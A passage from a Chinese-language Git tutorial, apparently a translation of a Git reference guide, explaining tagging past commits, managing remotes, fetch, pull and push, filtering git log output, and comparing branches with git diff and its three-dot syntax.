<p>不过我们并不需要给当前提交打标签。如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。 在相同的命令末尾加上提交的 SHA，执行，就可以了。 例如，假设我们发布了提交 <code>558151a</code>（几个提交之前的事情了），但是那时候忘了给它打标签。 我们现在也可以：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -a v0.9 558151a&#10;$ git log --oneline --decorate --graph&#10;* 594f90b (HEAD, tag: v1.0, master) reverted to old class name&#10;*   8d585ea Merge branch &#39;fix_readme&#39;&#10;|\&#10;| * 3ac015d (fix_readme) fixed readme title&#10;* | 3cbb6aa fixed readme title differently&#10;|/&#10;*   558151a (tag: v0.9) Merge branch &#39;change_class&#39;&#10;|\&#10;| * 3467b0a changed the class name&#10;* | b7ae93b added from ruby&#10;|/&#10;* 17f4acf first commit</span><br></pre></td></tr></table></figure>
<h1 id="分享与更新项目">分享与更新项目</h1><p><a href="http://git-scm.com/book/en/Git-Basics-Working-with-Remotes" target="_blank" rel="external">书</a></p>
<p>Git 并不像 Subversion 那样有个中心服务器。 目前为止所有的命令都是本地执行的，更新的知识本地的数据库。 要通过 Git 与其他开发者合作，你需要将数据放到一台其他开发者能够连接的服务器上。 Git 实现此流程的方式是将你的数据与另一个仓库同步。在服务器与客户端之间并没有实质的区别 —— Git 仓库就是 Git 仓库，你可以很容易地在两者之间同步。</p>
<p>一旦你有了个 Git 仓库，不管它是在你自己的服务器上，或者是由 GitHub 之类的地方提供， 你都可以告诉 Git 推送你拥有的远端仓库还没有的数据，或者叫 Git 从别的仓库把差别取过来。</p>
<p>联网的时候你可以随时做这个，它并不需要对应一个 <code>commit</code> 或者别的什么。 一般你会本地提交几次，然后从你的项目克隆自的线上的共享仓库提取数据以保持最新，将新完成的合并到你完成的工作中去，然后推送你的改动会服务器。</p>
<p><strong>简而言之</strong> 使用 <code>git fetch</code> 更新你的项目，使用 <code>git push</code> 分享你的改动。 你可以用 <code>git remote</code> 管理你的远程仓库。</p>
<h2 id="git_remote_罗列、添加和删除远端仓库别名"><code>git remote</code> 罗列、添加和删除远端仓库别名</h2><p><a href="http://git-scm.com/docs/git-remote" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Working-with-Remotes#Showing-Your-Remotes" target="_blank" rel="external">书</a> </p>
<p>不像中心化的版本控制系统（客户端与服务端很不一样），Git 仓库基本上都是一致的，并且并可以同步他们。 这使得拥有多个远端仓库变得容易 —— 你可以拥有一些只读的仓库，另外的一些也可写的仓库。</p>
<p>当你需要与远端仓库同步的时候，不需要使用它详细的链接。Git 储存了你感兴趣的远端仓库的链接的别名或者昵称。 你可以使用 <code>git remote</code> 命令管理这个远端仓库列表。</p>
<h3 id="git_remote_列出远端别名"><code>git remote</code> 列出远端别名</h3><p>如果没有任何参数，Git 会列出它存储的远端仓库别名了事。默认情况下，如果你的项目是克隆的（与本地创建一个新的相反）， Git 会自动将你的项目克隆自的仓库添加到列表中，并取名“origin”。 如果你执行时加上 <code>-v</code> 参数，你还可以看到每个别名的实际链接地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote&#10;origin&#10;$ git remote -v&#10;origin&#9;git@github.com:github/git-reference.git (fetch)&#10;origin&#9;git@github.com:github/git-reference.git (push)</span><br></pre></td></tr></table></figure>
<p>在此你看到了该链接两次，是因为 Git 允许你为每个远端仓库添加不同的推送与获取的链接，以备你读写时希望使用不同的协议。</p>
<h3 id="git_remote_add_为你的项目添加一个新的远端仓库"><code>git remote add</code> 为你的项目添加一个新的远端仓库</h3><p>如果你希望分享一个本地创建的仓库，或者你想要获取别人的仓库中的贡献 —— 如果你想要以任何方式与一个新仓库沟通，最简单的方式通常就是把它添加为一个远端仓库。 执行 <code>git remote add [alias] [url]</code> 就可以。 此命令将 <code>[url]</code> 以 <code>[alias]</code> 的别名添加为本地的远端仓库。</p>
<p>例如，假设我们想要与整个世界分享我们的 Hello World 程序。 我们可以在一台服务器上创建一个新仓库（我以 GitHub 为例子）。 它应该会给你一个链接，在这里就是“git@github.com:schacon/hw.git”。 要把它添加到我们的项目以便我们推送以及获取更新，我们可以这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote&#10;$ git remote add github git@github.com:schacon/hw.git&#10;$ git remote -v&#10;github&#9;git@github.com:schacon/hw.git (fetch)&#10;github&#9;git@github.com:schacon/hw.git (push)</span><br></pre></td></tr></table></figure>
<p>像分支的命名一样，远端仓库的别名是强制的 —— 就像“master”，没有特别意义，但它广为使用， 因为 <code>git init</code> 默认用它；“origin”经常被用作远端仓库别名，就因为 <code>git clone</code> 默认用它作为克隆自的链接的别名。此例中，我决定给我的远端仓库取名“github”，但我叫它随便什么都可以。</p>
<h3 id="git_remote_rm_删除现存的某个别名"><code>git remote rm</code> 删除现存的某个别名</h3><p>Git addeth and Git taketh away. 如果你需要删除一个远端 —— 不再需要它了、项目已经没了，等等 —— 你可以使用 <code>git remote rm [alias]</code> 把它删掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v&#10;github&#9;git@github.com:schacon/hw.git (fetch)&#10;github&#9;git@github.com:schacon/hw.git (push)&#10;$ git remote add origin git://github.com/pjhyett/hw.git&#10;$ git remote -v&#10;github&#9;git@github.com:schacon/hw.git (fetch)&#10;github&#9;git@github.com:schacon/hw.git (push)&#10;origin&#9;git://github.com/pjhyett/hw.git (fetch)&#10;origin&#9;git://github.com/pjhyett/hw.git (push)&#10;$ git remote rm origin&#10;$ git remote -v&#10;github&#9;git@github.com:schacon/hw.git (fetch)&#10;github&#9;git@github.com:schacon/hw.git (push)</span><br></pre></td></tr></table></figure>
<p><strong>简而言之</strong> 你可以用 <code>git remote</code> 列出你的远端仓库和那些仓库的链接。 你可以使用 <code>git remote add</code> 添加新的远端仓库，用 <code>git remote rm</code> 删掉已存在的那些。</p>
<h2 id="git_fetch_从远端仓库下载新分支与数据"><code>git fetch</code> 从远端仓库下载新分支与数据</h2><p><a href="http://git-scm.com/docs/git-fetch" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Working-with-Remotes#Fetching-and-Pulling-from-Your-Remotes" target="_blank" rel="external">书</a> </p>
<h2 id="git_pull_从远端仓库提取数据并尝试合并到当前分支"><code>git pull</code> 从远端仓库提取数据并尝试合并到当前分支</h2><p><a href="http://git-scm.com/docs/git-pull" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Working-with-Remotes#Fetching-and-Pulling-from-Your-Remotes" target="_blank" rel="external">书</a> </p>
<p>Git 有两个命令用来从某一远端仓库更新。 <code>git fetch</code> 会使你与另一仓库同步，提取你本地所没有的数据，为你在同步时的该远端的每一分支提供书签。 这些分支被叫做“远端分支”，除了 Git 不允许你检出（切换到该分支）之外，跟本地分支没区别 —— 你可以将它们合并到当前分支，与其他分支作比较差异，查看那些分支的历史日志，等等。同步之后你就可以在本地操作这些。</p>
<p>第二个会从远端服务器提取新数据的命令是 <code>git pull</code>。 基本上，该命令就是在 <code>git fetch</code> 之后紧接着 <code>git merge</code> 远端分支到你所在的任意分支。 我个人不太喜欢这命令 —— 我更喜欢 <code>fetch</code> 和 <code>merge</code> 分开来做。少点魔法，少点问题。 不过，如果你喜欢这主意，你可以看一下 <code>git pull</code> 的 <a href="http://git-scm.com/docs/git-pull" target="_blank" rel="external">官方文档</a>。</p>
<p>假设你配置好了一个远端，并且你想要提取更新，你可以首先执行 <code>git fetch [alias]</code> 告诉 Git 去获取它有你没有的数据，然后你可以执行 <code>git merge [alias]/[branch]</code> 以将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。 那么，如果我是与两三个其他人合作 Hello World 项目，并且想要将我最近连接之后的所有改动拿过来，我可以这么做：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch github&#10;remote: Counting objects: 4006, done.&#10;remote: Compressing objects: 100% (1322/1322), done.&#10;remote: Total 2783 (delta 1526), reused 2587 (delta 1387)&#10;Receiving objects: 100% (2783/2783), 1.23 MiB | 10 KiB/s, done.&#10;Resolving deltas: 100% (1526/1526), completed with 387 local objects.&#10;From github.com:schacon/hw&#10;   8e29b09..c7c5a10  master     -&#62; github/master&#10;   0709fdc..d4ccf73  c-langs    -&#62; github/c-langs&#10;   6684f82..ae06d2b  java       -&#62; github/java&#10; * [new branch]      ada        -&#62; github/ada&#10; * [new branch]      lisp       -&#62; github/lisp</span><br></pre></td></tr></table></figure>
<p>可以看到自从上一次与远端仓库同步以后，又新赠或更新了五个分支。 “ada”与“lisp”分支是新的，而“master”、“clang”与“java”分支则被更新了。 在此例中，我的团队在合并入主分支之前，将提议的更新推送到远端分支以审核。</p>
<p>你可以看到 Git 做的映射。远端仓库的主分支成为了本地的一个叫做“github/master”的分支。 这样我就可以执行 <code>git merge github/master</code> 将远端的主分支和并入我的本地主分支。 或者，我可以 <code>git log github/master ^master</code> 看看该分支上的新提交。 如果你的远端仓库叫做“origin”，那远端主分支就会叫做 <code>origin/master</code>。几乎所有能在本地分支上执行的命令都可以在远端分支上用。</p>
<p>如果你有多个远端仓库，你可以执行 <code>git fetch [alias]</code> 提取特定的远端仓库， 或者执行 <code>git fetch --all</code> 告诉 Git 同步所有的远端仓库。</p>
<p><strong>简而言之</strong> 执行 <code>git fetch [alias]</code> 来将你的仓库与远端仓库同步，提取所有它独有的数据到本地分支以合并或者怎样。</p>
<h2 id="git_push_推送你的新分支与数据到某个远端仓库"><code>git push</code> 推送你的新分支与数据到某个远端仓库</h2><p><a href="http://git-scm.com/docs/git-push" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Working-with-Remotes#Pushing-to-Your-Remotes" target="_blank" rel="external">书</a></p>
<p>想要与他人分享你牛鼻的提交，你需要将改动推送到远端仓库。 执行 <code>git push [alias] [branch]</code>，就会将你的 [branch] 分支推送成为 [alias] 远端上的 [branch] 分支。 让我们试试推送我们的主分支到先前添加的“github”远端仓库上去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push github master&#10;Counting objects: 25, done.&#10;Delta compression using up to 2 threads.&#10;Compressing objects: 100% (25/25), done.&#10;Writing objects: 100% (25/25), 2.43 KiB, done.&#10;Total 25 (delta 4), reused 0 (delta 0)&#10;To git@github.com:schacon/hw.git&#10; * [new branch]      master -&#62; master</span><br></pre></td></tr></table></figure>
<p>挺简单。现在如果有人从该仓库克隆，他会得到我提交的完完全全的一份历史记录了。</p>
<p>如果有个像之前创建的“erlang”分支那样的主题分支，想只分享这个，该怎么办呢？你可以相应的只推送该分支。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push github erlang&#10;Counting objects: 7, done.&#10;Delta compression using up to 2 threads.&#10;Compressing objects: 100% (6/6), done.&#10;Writing objects: 100% (6/6), 652 bytes, done.&#10;Total 6 (delta 1), reused 0 (delta 0)&#10;To git@github.com:schacon/hw.git&#10; * [new branch]      erlang -&#62; erlang</span><br></pre></td></tr></table></figure>
<p>现在当人们从该仓库克隆时，他们就会得到一个“erlang”分支以查阅、合并。 用这种方式，你可以推送任何分支到任何你有写权限的仓库。 如果你的分支已经在该仓库中了，它会试着去更新，如果它不再，Git 会把它加上。</p>
<p>最后一个当你推送到远端分支时会碰到的主要问题是，其他人在此期间也推送了的情况。 如果你和另一个开发者同时克隆了，又都有提交，那么当她推送后你也想推送时，默认情况下 Git 不会让你覆盖她的改动。 相反的，它会在你试图推送的分支上执行 <code>git log</code>，确定它能够在你的推送分支的历史记录中看到服务器分支的当前进度。 如果它在在你的历史记录中看不到，它就会下结论说你过时了，并打回你的推送。 你需要正式提取、合并，然后再次推送 —— 以确定你把她的改动也考虑在内了。</p>
<p>当你试图推送到某个以被更新的远端分支时，会出现下面这种情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push github master&#10;To git@github.com:schacon/hw.git&#10; ! [rejected]        master -&#62; master (non-fast-forward)&#10;error: failed to push some refs to &#39;git@github.com:schacon/hw.git&#39;&#10;To prevent you from losing history, non-fast-forward updates were rejected&#10;Merge the remote changes before pushing again.  See the &#39;Note about&#10;fast-forwards&#39; section of &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure>
<p>你可以修正这个问题。执行 <code>git fetch github; git merge github/master</code>，然后再推送</p>
<p><strong>简而言之</strong> 执行 <code>git push [alias] [branch]</code> 将你的本地改动推送到远端仓库。 如果可以的话，它会依据你的 [branch] 的样子，推送到远端的 [branch] 去。 如果在你上次提取、合并之后，另有人推送了，Git 服务器会拒绝你的推送，知道你是最新的为止。</p>
<h1 id="检查与比较">检查与比较</h1><p><a href="http://git-scm.com/book/en/Git-Basics-Viewing-the-Commit-History" target="_blank" rel="external">书</a> </p>
<p>现在你有了一堆分支，短期的主题、长期的特性或者其它。怎样追踪他们呢？ Git 有一组工具，可以帮助你弄明白工作是在哪儿完成的，两个分支间的区别是啥，等等。</p>
<p><strong>简而言之</strong> 执行 <code>git log</code> 找到你的项目历史中的特定提交 —— 按作者、日期、内容或者历史记录。执行 <code>git diff</code> 比较历史记录中的两个不同的点 —— 通常是为了看看两个分支有啥区别，或者从某个版本到另一个版本，你的软件都有啥变化。</p>
<h2 id="git_log_过滤你的提交历史记录"><code>git log</code> 过滤你的提交历史记录</h2><p><a href="http://git-scm.com/docs/git-log" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Viewing-the-Commit-History#Limiting-Log-Output" target="_blank" rel="external">书</a></p>
<p>通过查看分支中另一分支看不到的提交记录，我们已经看到如何用 <code>git log</code> 来比较分支。 （如果你不记得了，它看起来是这样的：<code>git log branchA ^branchB</code>）。 而且，你也可以用 <code>git log</code> 去寻找特定的提交。 在此，我们会看到一些更广为使用的 <code>git log</code> 选项，不过哪有很多。 完整的清单可以看看官方文档。</p>
<h3 id="git_log_-author_只寻找某个特定作者的提交"><code>git log --author</code> 只寻找某个特定作者的提交</h3><p>要过滤你的提交历史，只寻找某个特定作者的提交，你可以使用 <code>--author</code> 选项。 例如，比方说我们要找 Git 源码中 Linus 提交的部分。 我们可以执行类似 <code>git log --author=Linus</code> 的命令。 这个查找是大小写敏感的，并且也会检索电子邮箱地址。 我在此例中使用 <code>-[number]</code> 选项，以限制结果为最近 [number] 次的提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --author=Linus --oneline -5&#10;81b50f3 Move &#39;builtin-*&#39; into a &#39;builtin/&#39; subdirectory&#10;3bb7256 make &#34;index-pack&#34; a built-in&#10;377d027 make &#34;git pack-redundant&#34; a built-in&#10;b532581 make &#34;git unpack-file&#34; a built-in&#10;112dd51 make &#34;mktag&#34; a built-in</span><br></pre></td></tr></table></figure>
<h3 id="git_log_-since_-before_根据日期过滤提交记录"><code>git log --since --before</code> 根据日期过滤提交记录</h3><p>如果你要指定一个你感兴趣的日期范围以过滤你的提交，可以执行几个选项 —— 我用 <code>--since</code> 和 <code>--before</code>，但是你也可以用 <code>--until</code> 和 <code>--after</code>。 例如，如果我要看 Git 项目中三周前且在四月十八日之后的所有提交，我可以执行这个（我还用了 <code>--no-merges</code> 选项以隐藏合并提交）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --oneline --before=&#123;3.weeks.ago&#125; --after=&#123;2010-04-18&#125; --no-merges&#10;5469e2d Git 1.7.1-rc2&#10;d43427d Documentation/remote-helpers: Fix typos and improve language&#10;272a36b Fixup: Second argument may be any arbitrary string&#10;b6c8d2d Documentation/remote-helpers: Add invocation section&#10;5ce4f4e Documentation/urls: Rewrite to accomodate transport::address&#10;00b84e9 Documentation/remote-helpers: Rewrite description&#10;03aa87e Documentation: Describe other situations where -z affects git diff&#10;77bc694 rebase-interactive: silence warning when no commits rewritten&#10;636db2c t3301: add tests to use --format=&#34;%N&#34;</span><br></pre></td></tr></table></figure>
<h3 id="git_log_-grep_根据提交注释过滤提交记录"><code>git log --grep</code> 根据提交注释过滤提交记录</h3><p>你或许还想根据提交注释中的某个特定短语查找提交记录。可以用 <code>--grep</code> 选项。 比如说我知道有个提交是有关使用 P4EDITOR 环境变量，又想回忆起那个改动是啥样子的 —— 我可以用 <code>--grep</code> 选项找到该提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --grep=P4EDITOR --no-merges&#10;commit 82cea9ffb1c4677155e3e2996d76542502611370&#10;Author: Shawn Bohrer&#10;Date:   Wed Mar 12 19:03:24 2008 -0500&#10;&#10;    git-p4: Use P4EDITOR environment variable when set&#10;&#10;    Perforce allows you to set the P4EDITOR environment variable to your&#10;    preferred editor for use in perforce.  Since we are displaying a&#10;    perforce changelog to the user we should use it when it is defined.&#10;&#10;    Signed-off-by: Shawn Bohrer &#60;shawn.bohrer@gmail.com&#62;&#10;    Signed-off-by: Simon Hausmann &#60;simon@lst.de&#62;</span><br></pre></td></tr></table></figure>
<p>Git 会对所有的 <code>--grep</code> 和 <code>--author</code> 参数作逻辑或。 如果你用 <code>--grep</code> 和 <code>--author</code> 时，想看的是某人写作的并且有某个特殊的注释内容的提交记录， 你需要加上 <code>--all-match</code> 选项。 在这些例子中，我会用上 <code>--format</code> 选项，这样我们就可以看到每个提交的作者是谁了。</p>
<p>如果我查找注释内容含有 “p4 depo”的提交，我得到了三个提交：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --grep=&#34;p4 depo&#34; --format=&#34;%h %an %s&#34;&#10;ee4fd1a Junio C Hamano Merge branch &#39;master&#39; of git://repo.or.cz/git/fastimport&#10;da4a660 Benjamin Sergeant git-p4 fails when cloning a p4 depo.&#10;1cd5738 Simon Hausmann Make incremental imports easier to use by storing the p4 d</span><br></pre></td></tr></table></figure>
<p>如果我加上 <code>--author=Hausmann</code> 参数，与进一步过滤上述结果到 Simon 的唯一提交相反， 它会告诉我所有 Simon 的提交，或者注释中有“p4 demo”的提交：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --grep=&#34;p4 depo&#34; --format=&#34;%h %an %s&#34; --author=&#34;Hausmann&#34;&#10;cdc7e38 Simon Hausmann Make it possible to abort the submission of a change to Pe&#10;f5f7e4a Simon Hausmann Clean up the git-p4 documentation&#10;30b5940 Simon Hausmann git-p4: Fix import of changesets with file deletions&#10;4c750c0 Simon Hausmann git-p4: git-p4 submit cleanups.&#10;0e36f2d Simon Hausmann git-p4: Removed git-p4 submit --direct.&#10;edae1e2 Simon Hausmann git-p4: Clean up git-p4 submit&#39;s log message handling.&#10;4b61b5c Simon Hausmann git-p4: Remove --log-substitutions feature.&#10;36ee4ee Simon Hausmann git-p4: Ensure the working directory and the index are cle&#10;e96e400 Simon Hausmann git-p4: Fix submit user-interface.&#10;38f9f5e Simon Hausmann git-p4: Fix direct import from perforce after fetching cha&#10;2094714 Simon Hausmann git-p4: When skipping a patch as part of &#34;git-p4 submit&#34; m&#10;1ca3d71 Simon Hausmann git-p4: Added support for automatically importing newly ap&#10;...</span><br></pre></td></tr></table></figure>
<p>不过，如果加上 <code>--all-match</code>，结果就是我想要的了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --grep=&#34;p4 depo&#34; --format=&#34;%h %an %s&#34; --author=&#34;Hausmann&#34; --all-match&#10;1cd5738 Simon Hausmann Make incremental imports easier to use by storing the p4 d</span><br></pre></td></tr></table></figure>
<h3 id="git_log_-S_依据所引入的差值过滤"><code>git log -S</code> 依据所引入的差值过滤</h3><p>如果你写的提交注释都极度糟糕怎么办？或者，如果你要找某个函数是何时引入的，某些变量是在哪里开始被使用的？ 你可以告诉 Git 在每个提交之间的差值中查找特定字符串。 例如，如果我们想要找出哪个提交修改出了类似函数名“userformat_find_requirements”， 我们可以执行（注意在“-S”与你要找的东东之间没有“=”）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log -Suserformat_find_requirements&#10;commit 5b16360330822527eac1fa84131d185ff784c9fb&#10;Author: Johannes Gilger&#10;Date:   Tue Apr 13 22:31:12 2010 +0200&#10;&#10;    pretty: Initialize notes if %N is used&#10;&#10;    When using git log --pretty=&#39;%N&#39; without an explicit --show-notes, git&#10;    would segfault. This patches fixes this behaviour by loading the needed&#10;    notes datastructures if --pretty is used and the format contains %N.&#10;    When --pretty=&#39;%N&#39; is used together with --no-notes, %N won&#39;t be&#10;    expanded.&#10;&#10;    This is an extension to a proposed patch by Jeff King.&#10;&#10;    Signed-off-by: Johannes Gilger&#10;    Signed-off-by: Junio C Hamano</span><br></pre></td></tr></table></figure>
<h3 id="git_log_-p_显示每个提交引入的补丁"><code>git log -p</code> 显示每个提交引入的补丁</h3><p>每个提交都是项目的一个快照。由于每个提交都记录它所基于的快照，Git 能够经常对它们求差值，并以补丁形式向你展示。 这意味着，对任意提交，你都可以获取该提交给项目引入补丁。 你可以用 <code>git show [SHA]</code> 加上某个特定的提交 SHA 获取，或者执行 <code>git log -p</code>， 它会告诉 Git 输出每个提交之后的补丁。这是个总结某一分支或者两个提交之间都发生了神马的好途径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log -p --no-merges -2&#10;commit 594f90bdee4faf063ad07a4a6f503fdead3ef606&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 15:46:55 2010 +0200&#10;&#10;    reverted to old class name&#10;&#10;diff --git a/ruby.rb b/ruby.rb&#10;index bb86f00..192151c 100644&#10;--- a/ruby.rb&#10;+++ b/ruby.rb&#10;@@ -1,7 +1,7 @@&#10;-class HiWorld&#10;+class HelloWorld&#10;   def self.hello&#10;     puts &#34;Hello World from Ruby&#34;&#10;   end&#10; end&#10;&#10;-HiWorld.hello&#10;+HelloWorld.hello&#10;&#10;commit 3cbb6aae5c0cbd711c098e113ae436801371c95e&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 12:58:53 2010 +0200&#10;&#10;    fixed readme title differently&#10;&#10;diff --git a/README b/README&#10;index d053cc8..9103e27 100644&#10;--- a/README&#10;+++ b/README&#10;@@ -1,4 +1,4 @@&#10;-Hello World Examples&#10;+Many Hello World Examples&#10; ======================&#10;&#10; This project has examples of hello world in</span><br></pre></td></tr></table></figure>
<p>这是个总结改动，以及合并或发布之前重审一系列提交的好方式。</p>
<h3 id="git_log_-stat_显示每个提交引入的改动的差值统计"><code>git log --stat</code> 显示每个提交引入的改动的差值统计</h3><p>如果 <code>-p</code> 选项对你来说太详细了，你可以用 <code>--stat</code> 总结这些改动。 这是不用 <code>-p</code>，而用 <code>--stat</code> 选项时，同一份日志的输出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --stat --no-merges -2&#10;commit 594f90bdee4faf063ad07a4a6f503fdead3ef606&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 15:46:55 2010 +0200&#10;&#10;    reverted to old class name&#10;&#10; ruby.rb |    4 ++--&#10; 1 files changed, 2 insertions(+), 2 deletions(-)&#10;&#10;commit 3cbb6aae5c0cbd711c098e113ae436801371c95e&#10;Author: Scott Chacon &#60;schacon@gmail.com&#62;&#10;Date:   Fri Jun 4 12:58:53 2010 +0200&#10;&#10;    fixed readme title differently&#10;&#10; README |    2 +-&#10; 1 files changed, 1 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure>
<p>同样的基本信息，但更紧凑 —— 它仍然让你看到相对改动，和改动了哪些文件。</p>
<h2 id="git_diff"><code>git diff</code></h2><p><a href="http://git-scm.com/docs/git-diff" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Distributed-Git-Maintaining-a-Project#Determining-What-Is-Introduced" target="_blank" rel="external">书</a></p>
<p>最后，要查看两个提交快照的绝对改动，你可以用 <code>git diff</code> 命令。 这在两个主要情况中广为使用 —— 查看两个分支彼此之间的差值，和查看自发布或者某个旧历史点之后都有啥变了。让我们看看这俩情况。</p>
<p>你仅需执行 <code>git diff [version]</code>（或者你给该发布打的任何标签）就可以查看自最近发布之后的改动。 例如，如果我们想要看看自 v0.9 发布之后我们的项目改变了啥，我们可以执行 <code>git diff v0.9</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff v0.9&#10;diff --git a/README b/README&#10;index d053cc8..d4173d5 100644&#10;--- a/README&#10;+++ b/README&#10;@@ -1,4 +1,4 @@&#10;-Hello World Examples&#10;+Many Hello World Lang Examples&#10; ======================&#10;&#10; This project has examples of hello world in&#10;diff --git a/ruby.rb b/ruby.rb&#10;index bb86f00..192151c 100644&#10;--- a/ruby.rb&#10;+++ b/ruby.rb&#10;@@ -1,7 +1,7 @@&#10;-class HiWorld&#10;+class HelloWorld&#10;   def self.hello&#10;     puts &#34;Hello World from Ruby&#34;&#10;   end&#10; end&#10;&#10;-HiWorld.hello&#10;+HelloWorld.hello</span><br></pre></td></tr></table></figure>
<p>正如 <code>git log</code>，你可以给它加上 <code>--stat</code> 参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff v0.9 --stat&#10; README  |    2 +-&#10; ruby.rb |    4 ++--&#10; 2 files changed, 3 insertions(+), 3 deletions(-)</span><br></pre></td></tr></table></figure>
<p>要比较两个不同的分支，你可以执行类似 <code>git diff branchA branchB</code> 的命令。 不过它的问题在于它会完完全全按你说的作 —— 它会直接给你个补丁文件，该补丁能够将甲分支的最新快照变成乙分支的最新快照的样子。 这意味着如果两个分支已经产生分歧 —— 奔往两个不同方向了 —— 它会移除甲分支中引入的所有工作，然后累加乙分支中的所有工作。 这大概不是你要的吧 —— 你想要不在甲分支中的乙分支的改动。所以你真的需要的是两个分支叉开去时，和最新的乙分支的差别。 所以，如果我们的历史记录看起来像这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --graph --oneline --decorate --all&#10;* 594f90b (HEAD, tag: v1.0, master) reverted to old class name&#10;| * 1834130 (erlang) added haskell&#10;| * ab5ab4c added erlang&#10;|/&#10;*   8d585ea Merge branch &#39;fix_readme&#39;&#10;...</span><br></pre></td></tr></table></figure>
<p>并且，我们想要看“erlang”分支与主分支相比的查别。执行 <code>git diff master erlang</code> 会给我们错误的结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff --stat master erlang&#10; erlang_hw.erl |    5 +++++&#10; haskell.hs    |    4 ++++&#10; ruby.rb       |    4 ++--&#10; 3 files changed, 11 insertions(+), 2 deletions(-)</span><br></pre></td></tr></table></figure>
<p>你可以看到，它加上了 erlang 和 haskell 文件，这确实是我们在该分支中做的， 但是它同时恢复了我们在主分支中改动的 ruby 文件。我们真心想要的只是“erlang”分支中的改动（添加两个文件）。 我们可以通过求两个分支分歧时的共同提交与该分支的差值得到想要的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff --stat 8d585ea erlang&#10; erlang_hw.erl |    5 +++++&#10; haskell.hs    |    4 ++++&#10; 2 files changed, 9 insertions(+), 0 deletions(-)</span><br></pre></td></tr></table></figure>
<p>这才是我们在找的，但是我们可不想要每次都要找出两个分支分歧时的那次提交。 幸运的是，Git 为此提供了一个快捷方式。 如果你执行 <code>git diff master...erlang</code>（在分支名之间有三个半角的点）， Git 就会自动找出两个分支的共同提交（也被成为合并基础），并求差值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff --stat master erlang&#10; erlang_hw.erl |    5 +++++&#10; haskell.hs    |    4 ++++&#10; ruby.rb       |    4 ++--&#10; 3 files changed, 11 insertions(+), 2 deletions(-)&#10;$ git diff --stat master...erlang&#10; erlang_hw.erl |    5 +++++&#10; haskell.hs    |    4 ++++&#10; 2 files changed, 9 insertions(+), 0 deletions(-)</span><br></pre></td></tr></table></figure>
<p>几乎每一次你要对比两个分支的时候，你都会想用三个点的语法，因为它通常会给你你想要的。</p>
<p>顺带提一句，你还可以让 Git 手工计算两次提交的合并基础（第一个共同的祖提交），即 <code>git merge-base</code> 命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git merge-base master erlang&#10;8d585ea6faf99facd39b55d6f6a3b3f481ad0d3d</span><br></pre></td></tr></table></figure>
<p>所以你执行下面这个也跟 <code>git diff master...erlang</code> 一样：</p>
